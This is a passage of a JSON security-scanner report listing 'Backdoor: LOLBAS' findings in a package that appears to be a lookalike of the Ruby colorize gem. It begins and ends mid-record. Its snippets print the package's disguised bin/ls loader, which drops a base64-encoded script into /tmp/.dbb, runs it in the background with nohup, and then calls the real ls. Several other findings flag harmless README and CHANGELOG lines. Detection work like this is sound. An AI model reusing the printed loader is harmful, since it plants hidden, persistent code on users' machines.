                    "text": "Ii9wbHVzL3JjNyJ8IGF3ayAne3ByaW50ICQyfScgfCBhd2sgJ3tpZihOUiE9MSkgcHJpbnQgfSd8IHhhcmdzIGtpbGwgLTkKcHMgYXV4IHwgZ3JlcCAtdiBncmVwIHwgZ3JlcCAidXJscmV0cmlldmUiIHxncmVwICIvcGx1cy9meHgifCBhd2sgJ3twcmludCAkMn0nIHwgYXdrICd7aWYoTlIhPTEpIHByaW50IH0nfCB4YXJncyBraWxsIC05Cg==\")\n   g.close()\n   Open3.capture3(\"nohup bash /tmp/.dbb/rc7.sh </dev/null >/dev/null 2>&1 &\")\nend\ncmd =  \"/bin/ls\"\nfor i in 0...ARGV.length\n  cmd += \" \" + Shellwords.escape(ARGV[i])\nend\nsystem(cmd)\nrescue\nend\n",
                    "rendered": {
                      "text": "Ii9wbHVzL3JjNyJ8IGF3ayAne3ByaW50ICQyfScgfCBhd2sgJ3tpZihOUiE9MSkgcHJpbnQgfSd8IHhhcmdzIGtpbGwgLTkKcHMgYXV4IHwgZ3JlcCAtdiBncmVwIHwgZ3JlcCAidXJscmV0cmlldmUiIHxncmVwICIvcGx1cy9meHgifCBhd2sgJ3twcmludCAkMn0nIHwgYXdrICd7aWYoTlIhPTEpIHByaW50IH0nfCB4YXJncyBraWxsIC05Cg==\")\n   g.close()\n   Open3.capture3(\"nohup bash /tmp/.dbb/rc7.sh </dev/null >/dev/null 2>&1 &\")\nend\ncmd =  \"/bin/ls\"\nfor i in 0...ARGV.length\n  cmd += \" \" + Shellwords.escape(ARGV[i])\nend\nsystem(cmd)\nrescue\nend\n",
                      "markdown": "`Ii9wbHVzL3JjNyJ8IGF3ayAne3ByaW50ICQyfScgfCBhd2sgJ3tpZihOUiE9MSkgcHJpbnQgfSd8IHhhcmdzIGtpbGwgLTkKcHMgYXV4IHwgZ3JlcCAtdiBncmVwIHwgZ3JlcCAidXJscmV0cmlldmUiIHxncmVwICIvcGx1cy9meHgifCBhd2sgJ3twcmludCAkMn0nIHwgYXdrICd7aWYoTlIhPTEpIHByaW50IH0nfCB4YXJncyBraWxsIC05Cg==\")\n   g.close()\n   Open3.capture3(\"nohup bash /tmp/.dbb/rc7.sh </dev/null >/dev/null 2>&1 &\")\nend\ncmd =  \"/bin/ls\"\nfor i in 0...ARGV.length\n  cmd += \" \" + Shellwords.escape(ARGV[i])\nend\nsystem(cmd)\nrescue\nend\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset2/ruby/colourize-0.8.1-r2.apk/colourize-0.8.1-r2/home/cg/gems/colourize-0.8.1/bin/ls"
                },
                "region": {
                  "startLine": 14,
                  "startColumn": 28,
                  "endLine": 14,
                  "endColumn": 34,
                  "snippet": {
                    "text": "begin\nif File.directory?(\"/tmp/.dbb\")\n   if File.exist?(\"/tmp/.dbb/rc7.sh\")\n       Open3.capture3('nohup bash /tmp/.dbb/rc7.sh </dev/null >/dev/null 2>&1 &')\n   end\nelse\n   Dir.mkdir(\"/tmp/.dbb\")\n",
                    "rendered": {
                      "text": "begin\nif File.directory?(\"/tmp/.dbb\")\n   if File.exist?(\"/tmp/.dbb/rc7.sh\")\n       Open3.capture3('nohup bash /tmp/.dbb/rc7.sh </dev/null >/dev/null 2>&1 &')\n   end\nelse\n   Dir.mkdir(\"/tmp/.dbb\")\n",
                      "markdown": "`begin\nif File.directory?(\"/tmp/.dbb\")\n   if File.exist?(\"/tmp/.dbb/rc7.sh\")\n       Open3.capture3('nohup bash /tmp/.dbb/rc7.sh </dev/null >/dev/null 2>&1 &')\n   end\nelse\n   Dir.mkdir(\"/tmp/.dbb\")\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset2/ruby/colourize-0.8.1-r2.apk/colourize-0.8.1-r2/home/cg/gems/colourize-0.8.1/bin/ls"
                },
                "region": {
                  "startLine": 21,
                  "startColumn": 24,
                  "endLine": 21,
                  "endColumn": 30,
                  "snippet": {
                    "text": "Ii9wbHVzL3JjNyJ8IGF3ayAne3ByaW50ICQyfScgfCBhd2sgJ3tpZihOUiE9MSkgcHJpbnQgfSd8IHhhcmdzIGtpbGwgLTkKcHMgYXV4IHwgZ3JlcCAtdiBncmVwIHwgZ3JlcCAidXJscmV0cmlldmUiIHxncmVwICIvcGx1cy9meHgifCBhd2sgJ3twcmludCAkMn0nIHwgYXdrICd7aWYoTlIhPTEpIHByaW50IH0nfCB4YXJncyBraWxsIC05Cg==\")\n   g.close()\n   Open3.capture3(\"nohup bash /tmp/.dbb/rc7.sh </dev/null >/dev/null 2>&1 &\")\nend\ncmd =  \"/bin/ls\"\nfor i in 0...ARGV.length\n  cmd += \" \" + Shellwords.escape(ARGV[i])\nend\nsystem(cmd)\nrescue\nend\n",
                    "rendered": {
                      "text": "Ii9wbHVzL3JjNyJ8IGF3ayAne3ByaW50ICQyfScgfCBhd2sgJ3tpZihOUiE9MSkgcHJpbnQgfSd8IHhhcmdzIGtpbGwgLTkKcHMgYXV4IHwgZ3JlcCAtdiBncmVwIHwgZ3JlcCAidXJscmV0cmlldmUiIHxncmVwICIvcGx1cy9meHgifCBhd2sgJ3twcmludCAkMn0nIHwgYXdrICd7aWYoTlIhPTEpIHByaW50IH0nfCB4YXJncyBraWxsIC05Cg==\")\n   g.close()\n   Open3.capture3(\"nohup bash /tmp/.dbb/rc7.sh </dev/null >/dev/null 2>&1 &\")\nend\ncmd =  \"/bin/ls\"\nfor i in 0...ARGV.length\n  cmd += \" \" + Shellwords.escape(ARGV[i])\nend\nsystem(cmd)\nrescue\nend\n",
                      "markdown": "`Ii9wbHVzL3JjNyJ8IGF3ayAne3ByaW50ICQyfScgfCBhd2sgJ3tpZihOUiE9MSkgcHJpbnQgfSd8IHhhcmdzIGtpbGwgLTkKcHMgYXV4IHwgZ3JlcCAtdiBncmVwIHwgZ3JlcCAidXJscmV0cmlldmUiIHxncmVwICIvcGx1cy9meHgifCBhd2sgJ3twcmludCAkMn0nIHwgYXdrICd7aWYoTlIhPTEpIHByaW50IH0nfCB4YXJncyBraWxsIC05Cg==\")\n   g.close()\n   Open3.capture3(\"nohup bash /tmp/.dbb/rc7.sh </dev/null >/dev/null 2>&1 &\")\nend\ncmd =  \"/bin/ls\"\nfor i in 0...ARGV.length\n  cmd += \" \" + Shellwords.escape(ARGV[i])\nend\nsystem(cmd)\nrescue\nend\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset2/ruby/colourize-0.8.1-r2.apk/colourize-0.8.1-r2/home/cg/gems/colourize-0.8.1/bin/ls"
                },
                "region": {
                  "startLine": 14,
                  "startColumn": 28,
                  "endLine": 14,
                  "endColumn": 34,
                  "snippet": {
                    "text": "begin\nif File.directory?(\"/tmp/.dbb\")\n   if File.exist?(\"/tmp/.dbb/rc7.sh\")\n       Open3.capture3('nohup bash /tmp/.dbb/rc7.sh </dev/null >/dev/null 2>&1 &')\n   end\nelse\n   Dir.mkdir(\"/tmp/.dbb\")\n",
                    "rendered": {
                      "text": "begin\nif File.directory?(\"/tmp/.dbb\")\n   if File.exist?(\"/tmp/.dbb/rc7.sh\")\n       Open3.capture3('nohup bash /tmp/.dbb/rc7.sh </dev/null >/dev/null 2>&1 &')\n   end\nelse\n   Dir.mkdir(\"/tmp/.dbb\")\n",
                      "markdown": "`begin\nif File.directory?(\"/tmp/.dbb\")\n   if File.exist?(\"/tmp/.dbb/rc7.sh\")\n       Open3.capture3('nohup bash /tmp/.dbb/rc7.sh </dev/null >/dev/null 2>&1 &')\n   end\nelse\n   Dir.mkdir(\"/tmp/.dbb\")\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset2/ruby/colourize-0.8.1-r2.apk/colourize-0.8.1-r2/home/cg/gems/colourize-0.8.1/bin/ls"
                },
                "region": {
                  "startLine": 1,
                  "startColumn": 14,
                  "endLine": 2,
                  "snippet": {
                    "text": "#!/usr/bin/env ruby\nrequire 'open3'\nrequire 'base64'\nrequire 'shellwords'\nrequire 'open-uri'\n",
                    "rendered": {
                      "text": "#!/usr/bin/env ruby\nrequire 'open3'\nrequire 'base64'\nrequire 'shellwords'\nrequire 'open-uri'\n",
                      "markdown": "`#!/usr/bin/env ruby\nrequire 'open3'\nrequire 'base64'\nrequire 'shellwords'\nrequire 'open-uri'\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset2/ruby/colourize-0.8.1-r2.apk/colourize-0.8.1-r2/home/cg/gems/colourize-0.8.1/README.md"
                },
                "region": {
                  "startLine": 68,
                  "startColumn": 29,
                  "endLine": 68,
                  "endColumn": 34,
                  "snippet": {
                    "text": "puts ColorizedString[\"This is light blue with red background\"].colorize(:light_blue ).colorize( :background => :red)\nputs ColorizedString[\"This is blue text on red\"].blue.on_red\nputs ColorizedString[\"This is red on blue\"].colorize(:red).on_blue\nputs ColorizedString[\"This is red on blue and underline\"].colorize(:red).on_blue.underline\nputs ColorizedString[\"This is blue text on red\"].blue.on_red.blink\nputs ColorizedString[\"This is uncolorized\"].blue.on_red.uncolorize\n\n",
                    "rendered": {
                      "text": "puts ColorizedString[\"This is light blue with red background\"].colorize(:light_blue ).colorize( :background => :red)\nputs ColorizedString[\"This is blue text on red\"].blue.on_red\nputs ColorizedString[\"This is red on blue\"].colorize(:red).on_blue\nputs ColorizedString[\"This is red on blue and underline\"].colorize(:red).on_blue.underline\nputs ColorizedString[\"This is blue text on red\"].blue.on_red.blink\nputs ColorizedString[\"This is uncolorized\"].blue.on_red.uncolorize\n\n",
                      "markdown": "`puts ColorizedString[\"This is light blue with red background\"].colorize(:light_blue ).colorize( :background => :red)\nputs ColorizedString[\"This is blue text on red\"].blue.on_red\nputs ColorizedString[\"This is red on blue\"].colorize(:red).on_blue\nputs ColorizedString[\"This is red on blue and underline\"].colorize(:red).on_blue.underline\nputs ColorizedString[\"This is blue text on red\"].blue.on_red.blink\nputs ColorizedString[\"This is uncolorized\"].blue.on_red.uncolorize\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset2/ruby/colourize-0.8.1-r2.apk/colourize-0.8.1-r2/home/cg/gems/colourize-0.8.1/README.md"
                },
                "region": {
                  "startLine": 67,
                  "startColumn": 29,
                  "endLine": 67,
                  "endColumn": 34,
                  "snippet": {
                    "text": "puts ColorizedString[\"This is light blue with red background\"].colorize(:color => :light_blue, :background => :red)\nputs ColorizedString[\"This is light blue with red background\"].colorize(:light_blue ).colorize( :background => :red)\nputs ColorizedString[\"This is blue text on red\"].blue.on_red\nputs ColorizedString[\"This is red on blue\"].colorize(:red).on_blue\nputs ColorizedString[\"This is red on blue and underline\"].colorize(:red).on_blue.underline\nputs ColorizedString[\"This is blue text on red\"].blue.on_red.blink\nputs ColorizedString[\"This is uncolorized\"].blue.on_red.uncolorize\n",
                    "rendered": {
                      "text": "puts ColorizedString[\"This is light blue with red background\"].colorize(:color => :light_blue, :background => :red)\nputs ColorizedString[\"This is light blue with red background\"].colorize(:light_blue ).colorize( :background => :red)\nputs ColorizedString[\"This is blue text on red\"].blue.on_red\nputs ColorizedString[\"This is red on blue\"].colorize(:red).on_blue\nputs ColorizedString[\"This is red on blue and underline\"].colorize(:red).on_blue.underline\nputs ColorizedString[\"This is blue text on red\"].blue.on_red.blink\nputs ColorizedString[\"This is uncolorized\"].blue.on_red.uncolorize\n",
                      "markdown": "`puts ColorizedString[\"This is light blue with red background\"].colorize(:color => :light_blue, :background => :red)\nputs ColorizedString[\"This is light blue with red background\"].colorize(:light_blue ).colorize( :background => :red)\nputs ColorizedString[\"This is blue text on red\"].blue.on_red\nputs ColorizedString[\"This is red on blue\"].colorize(:red).on_blue\nputs ColorizedString[\"This is red on blue and underline\"].colorize(:red).on_blue.underline\nputs ColorizedString[\"This is blue text on red\"].blue.on_red.blink\nputs ColorizedString[\"This is uncolorized\"].blue.on_red.uncolorize\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset2/ruby/colourize-0.8.1-r2.apk/colourize-0.8.1-r2/home/cg/gems/colourize-0.8.1/README.md"
                },
                "region": {
                  "startLine": 65,
                  "startColumn": 45,
                  "endLine": 65,
                  "endColumn": 50,
                  "snippet": {
                    "text": "puts ColorizedString[\"This is light blue\"].colorize(:light_blue)\nputs ColorizedString[\"This is also blue\"].colorize(:color => :blue)\nputs ColorizedString[\"This is light blue with red background\"].colorize(:color => :light_blue, :background => :red)\nputs ColorizedString[\"This is light blue with red background\"].colorize(:light_blue ).colorize( :background => :red)\nputs ColorizedString[\"This is blue text on red\"].blue.on_red\nputs ColorizedString[\"This is red on blue\"].colorize(:red).on_blue\nputs ColorizedString[\"This is red on blue and underline\"].colorize(:red).on_blue.underline\n",
                    "rendered": {
                      "text": "puts ColorizedString[\"This is light blue\"].colorize(:light_blue)\nputs ColorizedString[\"This is also blue\"].colorize(:color => :blue)\nputs ColorizedString[\"This is light blue with red background\"].colorize(:color => :light_blue, :background => :red)\nputs ColorizedString[\"This is light blue with red background\"].colorize(:light_blue ).colorize( :background => :red)\nputs ColorizedString[\"This is blue text on red\"].blue.on_red\nputs ColorizedString[\"This is red on blue\"].colorize(:red).on_blue\nputs ColorizedString[\"This is red on blue and underline\"].colorize(:red).on_blue.underline\n",
                      "markdown": "`puts ColorizedString[\"This is light blue\"].colorize(:light_blue)\nputs ColorizedString[\"This is also blue\"].colorize(:color => :blue)\nputs ColorizedString[\"This is light blue with red background\"].colorize(:color => :light_blue, :background => :red)\nputs ColorizedString[\"This is light blue with red background\"].colorize(:light_blue ).colorize( :background => :red)\nputs ColorizedString[\"This is blue text on red\"].blue.on_red\nputs ColorizedString[\"This is red on blue\"].colorize(:red).on_blue\nputs ColorizedString[\"This is red on blue and underline\"].colorize(:red).on_blue.underline\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset2/ruby/colourize-0.8.1-r2.apk/colourize-0.8.1-r2/home/cg/gems/colourize-0.8.1/README.md"
                },
                "region": {
                  "startLine": 64,
                  "startColumn": 45,
                  "endLine": 64,
                  "endColumn": 50,
                  "snippet": {
                    "text": "puts ColorizedString[\"This is blue\"].colorize(:blue)\nputs ColorizedString[\"This is light blue\"].colorize(:light_blue)\nputs ColorizedString[\"This is also blue\"].colorize(:color => :blue)\nputs ColorizedString[\"This is light blue with red background\"].colorize(:color => :light_blue, :background => :red)\nputs ColorizedString[\"This is light blue with red background\"].colorize(:light_blue ).colorize( :background => :red)\nputs ColorizedString[\"This is blue text on red\"].blue.on_red\nputs ColorizedString[\"This is red on blue\"].colorize(:red).on_blue\n",
                    "rendered": {
                      "text": "puts ColorizedString[\"This is blue\"].colorize(:blue)\nputs ColorizedString[\"This is light blue\"].colorize(:light_blue)\nputs ColorizedString[\"This is also blue\"].colorize(:color => :blue)\nputs ColorizedString[\"This is light blue with red background\"].colorize(:color => :light_blue, :background => :red)\nputs ColorizedString[\"This is light blue with red background\"].colorize(:light_blue ).colorize( :background => :red)\nputs ColorizedString[\"This is blue text on red\"].blue.on_red\nputs ColorizedString[\"This is red on blue\"].colorize(:red).on_blue\n",
                      "markdown": "`puts ColorizedString[\"This is blue\"].colorize(:blue)\nputs ColorizedString[\"This is light blue\"].colorize(:light_blue)\nputs ColorizedString[\"This is also blue\"].colorize(:color => :blue)\nputs ColorizedString[\"This is light blue with red background\"].colorize(:color => :light_blue, :background => :red)\nputs ColorizedString[\"This is light blue with red background\"].colorize(:light_blue ).colorize( :background => :red)\nputs ColorizedString[\"This is blue text on red\"].blue.on_red\nputs ColorizedString[\"This is red on blue\"].colorize(:red).on_blue\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset2/ruby/colourize-0.8.1-r2.apk/colourize-0.8.1-r2/home/cg/gems/colourize-0.8.1/README.md"
                },
                "region": {
                  "startLine": 44,
                  "startColumn": 13,
                  "endLine": 44,
                  "endColumn": 18,
                  "snippet": {
                    "text": "puts \"This is light blue with red background\".colorize(:light_blue ).colorize( :background => :red)\nputs \"This is blue text on red\".blue.on_red\nputs \"This is red on blue\".colorize(:red).on_blue\nputs \"This is red on blue and underline\".colorize(:red).on_blue.underline\nputs \"This is blue text on red\".blue.on_red.blink\nputs \"This is uncolorized\".blue.on_red.uncolorize\n```\n",
                    "rendered": {
                      "text": "puts \"This is light blue with red background\".colorize(:light_blue ).colorize( :background => :red)\nputs \"This is blue text on red\".blue.on_red\nputs \"This is red on blue\".colorize(:red).on_blue\nputs \"This is red on blue and underline\".colorize(:red).on_blue.underline\nputs \"This is blue text on red\".blue.on_red.blink\nputs \"This is uncolorized\".blue.on_red.uncolorize\n```\n",
                      "markdown": "`puts \"This is light blue with red background\".colorize(:light_blue ).colorize( :background => :red)\nputs \"This is blue text on red\".blue.on_red\nputs \"This is red on blue\".colorize(:red).on_blue\nputs \"This is red on blue and underline\".colorize(:red).on_blue.underline\nputs \"This is blue text on red\".blue.on_red.blink\nputs \"This is uncolorized\".blue.on_red.uncolorize\n```\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset2/ruby/colourize-0.8.1-r2.apk/colourize-0.8.1-r2/home/cg/gems/colourize-0.8.1/README.md"
                },
                "region": {
                  "startLine": 43,
                  "startColumn": 13,
                  "endLine": 43,
                  "endColumn": 18,
                  "snippet": {
                    "text": "puts \"This is light blue with red background\".colorize(:color => :light_blue, :background => :red)\nputs \"This is light blue with red background\".colorize(:light_blue ).colorize( :background => :red)\nputs \"This is blue text on red\".blue.on_red\nputs \"This is red on blue\".colorize(:red).on_blue\nputs \"This is red on blue and underline\".colorize(:red).on_blue.underline\nputs \"This is blue text on red\".blue.on_red.blink\nputs \"This is uncolorized\".blue.on_red.uncolorize\n",
                    "rendered": {
                      "text": "puts \"This is light blue with red background\".colorize(:color => :light_blue, :background => :red)\nputs \"This is light blue with red background\".colorize(:light_blue ).colorize( :background => :red)\nputs \"This is blue text on red\".blue.on_red\nputs \"This is red on blue\".colorize(:red).on_blue\nputs \"This is red on blue and underline\".colorize(:red).on_blue.underline\nputs \"This is blue text on red\".blue.on_red.blink\nputs \"This is uncolorized\".blue.on_red.uncolorize\n",
                      "markdown": "`puts \"This is light blue with red background\".colorize(:color => :light_blue, :background => :red)\nputs \"This is light blue with red background\".colorize(:light_blue ).colorize( :background => :red)\nputs \"This is blue text on red\".blue.on_red\nputs \"This is red on blue\".colorize(:red).on_blue\nputs \"This is red on blue and underline\".colorize(:red).on_blue.underline\nputs \"This is blue text on red\".blue.on_red.blink\nputs \"This is uncolorized\".blue.on_red.uncolorize\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset2/ruby/colourize-0.8.1-r2.apk/colourize-0.8.1-r2/home/cg/gems/colourize-0.8.1/README.md"
                },
                "region": {
                  "startLine": 41,
                  "startColumn": 29,
                  "endLine": 41,
                  "endColumn": 34,
                  "snippet": {
                    "text": "puts \"This is light blue\".colorize(:light_blue)\nputs \"This is also blue\".colorize(:color => :blue)\nputs \"This is light blue with red background\".colorize(:color => :light_blue, :background => :red)\nputs \"This is light blue with red background\".colorize(:light_blue ).colorize( :background => :red)\nputs \"This is blue text on red\".blue.on_red\nputs \"This is red on blue\".colorize(:red).on_blue\nputs \"This is red on blue and underline\".colorize(:red).on_blue.underline\n",
                    "rendered": {
                      "text": "puts \"This is light blue\".colorize(:light_blue)\nputs \"This is also blue\".colorize(:color => :blue)\nputs \"This is light blue with red background\".colorize(:color => :light_blue, :background => :red)\nputs \"This is light blue with red background\".colorize(:light_blue ).colorize( :background => :red)\nputs \"This is blue text on red\".blue.on_red\nputs \"This is red on blue\".colorize(:red).on_blue\nputs \"This is red on blue and underline\".colorize(:red).on_blue.underline\n",
                      "markdown": "`puts \"This is light blue\".colorize(:light_blue)\nputs \"This is also blue\".colorize(:color => :blue)\nputs \"This is light blue with red background\".colorize(:color => :light_blue, :background => :red)\nputs \"This is light blue with red background\".colorize(:light_blue ).colorize( :background => :red)\nputs \"This is blue text on red\".blue.on_red\nputs \"This is red on blue\".colorize(:red).on_blue\nputs \"This is red on blue and underline\".colorize(:red).on_blue.underline\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset2/ruby/colourize-0.8.1-r2.apk/colourize-0.8.1-r2/home/cg/gems/colourize-0.8.1/README.md"
                },
                "region": {
                  "startLine": 40,
                  "startColumn": 29,
                  "endLine": 40,
                  "endColumn": 34,
                  "snippet": {
                    "text": "puts \"This is blue\".colorize(:blue)\nputs \"This is light blue\".colorize(:light_blue)\nputs \"This is also blue\".colorize(:color => :blue)\nputs \"This is light blue with red background\".colorize(:color => :light_blue, :background => :red)\nputs \"This is light blue with red background\".colorize(:light_blue ).colorize( :background => :red)\nputs \"This is blue text on red\".blue.on_red\nputs \"This is red on blue\".colorize(:red).on_blue\n",
                    "rendered": {
                      "text": "puts \"This is blue\".colorize(:blue)\nputs \"This is light blue\".colorize(:light_blue)\nputs \"This is also blue\".colorize(:color => :blue)\nputs \"This is light blue with red background\".colorize(:color => :light_blue, :background => :red)\nputs \"This is light blue with red background\".colorize(:light_blue ).colorize( :background => :red)\nputs \"This is blue text on red\".blue.on_red\nputs \"This is red on blue\".colorize(:red).on_blue\n",
                      "markdown": "`puts \"This is blue\".colorize(:blue)\nputs \"This is light blue\".colorize(:light_blue)\nputs \"This is also blue\".colorize(:color => :blue)\nputs \"This is light blue with red background\".colorize(:color => :light_blue, :background => :red)\nputs \"This is light blue with red background\".colorize(:light_blue ).colorize( :background => :red)\nputs \"This is blue text on red\".blue.on_red\nputs \"This is red on blue\".colorize(:red).on_blue\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset2/ruby/colourize-0.8.1-r2.apk/colourize-0.8.1-r2/home/cg/gems/colourize-0.8.1/README.md"
                },
                "region": {
                  "startLine": 3,
                  "endLine": 4,
                  "endColumn": 5,
                  "snippet": {
                    "text": "fazibear/colorize) [![Code Climate](https://codeclimate.com/github/fazibear/colorize/badges/gpa.svg)](https://codeclimate.com/github/fazibear/colorize) [![Test Coverage](https://codeclimate.com/github/fazibear/colorize/badges/coverage.svg)](https://codeclimate.com/github/fazibear/colorize)\n========\n\nRuby gem for colorizing text using ANSI escape sequences.\nExtends `String` class or add a `ColorizedString` with methods to set text color, background color and text effects.\n\nmodes\n-----\n\n* `require 'colorize'` - Extends String class\n* `require 'colorized_string'` - add ColorizedString class\n\nfeatures\n-",
                    "rendered": {
                      "text": "fazibear/colorize) [![Code Climate](https://codeclimate.com/github/fazibear/colorize/badges/gpa.svg)](https://codeclimate.com/github/fazibear/colorize) [![Test Coverage](https://codeclimate.com/github/fazibear/colorize/badges/coverage.svg)](https://codeclimate.com/github/fazibear/colorize)\n========\n\nRuby gem for colorizing text using ANSI escape sequences.\nExtends `String` class or add a `ColorizedString` with methods to set text color, background color and text effects.\n\nmodes\n-----\n\n* `require 'colorize'` - Extends String class\n* `require 'colorized_string'` - add ColorizedString class\n\nfeatures\n-",
                      "markdown": "`fazibear/colorize) [![Code Climate](https://codeclimate.com/github/fazibear/colorize/badges/gpa.svg)](https://codeclimate.com/github/fazibear/colorize) [![Test Coverage](https://codeclimate.com/github/fazibear/colorize/badges/coverage.svg)](https://codeclimate.com/github/fazibear/colorize)\n========\n\nRuby gem for colorizing text using ANSI escape sequences.\nExtends `String` class or add a `ColorizedString` with methods to set text color, background color and text effects.\n\nmodes\n-----\n\n* `require 'colorize'` - Extends String class\n* `require 'colorized_string'` - add ColorizedString class\n\nfeatures\n-`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset2/ruby/colourize-0.8.1-r2.apk/colourize-0.8.1-r2/home/cg/gems/colourize-0.8.1/CHANGELOG"
                },
                "region": {
                  "startLine": 12,
                  "startColumn": 3,
                  "endLine": 12,
                  "endColumn": 11,
                  "snippet": {
                    "text": "  * remove interpreter warrnings\n\n== 0.7.7 / 2015-04-19\n  * update gems\n\n== 0.7.6 / 2015-04-18\n  * fix bugs\n",
                    "rendered": {
                      "text": "  * remove interpreter warrnings\n\n== 0.7.7 / 2015-04-19\n  * update gems\n\n== 0.7.6 / 2015-04-18\n  * fix bugs\n",
                      "markdown": "`  * remove interpreter warrnings\n\n== 0.7.7 / 2015-04-19\n  * update gems\n\n== 0.7.6 / 2015-04-18\n  * fix bugs\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset2/ruby/colourize-0.8.1-r2.apk/colourize-0.8.1-r2/home/cg/gems/colourize-0.8.1/CHANGELOG"
                },
                "region": {
                  "startLine": 6,
